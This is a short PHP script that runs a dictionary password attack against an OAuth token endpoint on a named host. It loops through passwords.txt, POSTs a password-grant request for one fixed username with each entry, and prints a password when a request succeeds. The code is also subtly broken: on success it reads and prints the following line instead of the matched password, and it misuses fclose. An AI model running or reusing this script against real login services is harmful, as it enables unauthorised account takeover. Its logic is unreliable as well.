
<?php 
        // create curl resource 
	$url = 'http://alpha.tutorez.com/token';
	
	$file = new SplFileObject("passwords.txt");
	while(!$file->eof()){
	   
		$options = array(
		    'http' => array(
			'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
			'method'  => 'POST',
			'content' => 'grant_type=password&username=cliente999tester@tutorez.com&password='.$file->fgets()
		    )
		);
		$context  = stream_context_create($options);
	
		$result = file_get_contents($url, false, $context);
		if( $result == true){ 
		    echo "hola pass: ".$file->fgets();
		    exit(); 
		} 
	}
	fclose($file);

	
	 
 

?>
